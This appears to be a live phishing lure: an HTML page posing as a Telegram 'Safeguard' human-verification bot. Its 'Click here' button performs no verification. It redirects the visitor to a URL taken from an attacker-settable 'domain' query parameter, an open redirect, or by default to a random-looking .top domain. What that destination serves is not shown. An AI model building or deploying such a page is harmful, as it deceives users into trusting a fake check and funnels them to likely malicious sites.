<!DOCTYPE html>
<html style="--tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <title>Safeguard</title>
    <meta name="description" content="@Safeguard Verification Bot">
    <link rel="icon" href="/favicon.ico">
    <link rel="stylesheet" href="style.css">
    <script>
        function getRedirectUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            const domain = urlParams.get('domain');
            return domain ? domain : 'https://sdnfhbguysdhifjo.top/x';
        }

        function setColors() {
            const urlParams = new URLSearchParams(window.location.search);
            const bgColor = urlParams.get('bg_color');
            const textColor = urlParams.get('text_color');

            if (bgColor) {
                document.body.style.backgroundColor = bgColor;
            }

            if (textColor) {
                const textElements = document.querySelectorAll('.text-telegram-text');
                textElements.forEach(element => {
                    element.style.color = textColor;
                });
            }
        }

        function redirectToDomain(button) {
            button.textContent = "Loading...";
            button.disabled = true;

            const redirectUrl = getRedirectUrl();
            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 1000);
        }

        window.onload = setColors; // Call setColors when the window loads
    </script>
</head>
<body>
    <div id="__next">
        <div class="bg-telegram-bg">
            <main class="flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center">
                <div class="mt-5">
                    <p class="text-3xl font-bold text-telegram-text">Human Verification</p>
                    <p class="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
                    <div class="flex items-center justify-center w-100 mt-3">
                        <button onclick="redirectToDomain(this)" class="w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">
                            Click here
                        </button>
                    </div>
                </div>
            </main>
        </div>
    </div>
</body>
</html>
